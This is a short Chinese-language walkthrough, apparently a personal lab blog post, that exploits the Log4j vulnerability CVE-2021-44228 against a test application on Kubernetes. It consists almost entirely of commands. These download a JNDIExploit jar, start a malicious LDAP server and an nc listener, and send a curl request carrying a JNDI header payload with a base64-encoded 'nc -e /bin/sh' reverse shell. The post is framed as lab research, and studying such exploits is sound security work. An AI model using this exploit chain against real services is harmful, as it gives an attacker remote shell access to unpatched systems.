CVE-2021-44228（Log4j）的漏洞出来有一段时间了，我这种自己没有开发能力的就只能等人家的漏洞利用工具出来再实践研究漏洞利用的过程，

首先在kubernetes下部署有漏洞的应用，

git clone https://github.com/kubearmor/log4j-cve，

cd log4j-cve，

kubectl apply -f deploy-log4j-k8s.yaml，

查询到漏洞应用发布服务的NodePort端口，从外网访问时需要用到，

kubectl get service，

然后部署攻击机，ubuntu18.04，

安装java，sudo apt install openjdk-8-jdk，

下载恶意LDAP程序，

wget https://log4j-knox.s3.amazonaws.com/JNDIExploit-1.2-SNAPSHOT.jar，

启动恶意LDAP服务，

java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 10.90.11.164 -p 8888，

在攻击机上新开一个shell，启动nc监听，nc -lnvp 8083，

构造一个反弹shell命令，nc 10.90.11.164 8083 -e /bin/sh，

找个在线网站做base64编码，

把base64编码填到对靶机的恶意请求中，

curl http://10.90.11.166:32431 -H 'X-Api-Version: ${jndi:ldap://10.90.11.164:1389/Basic/Command/Base64/bmMgMTAuOTAuMTEuMTY0IDgwODMgLWUgL2Jpbi9zaA==}'，

这样nc监听这边就拿到了靶机的反弹shell，

能够看到恶意LDAP服务的处理过程，

多说一句，实践过程来自网络，仅用于对漏洞利用过程的研究使用。
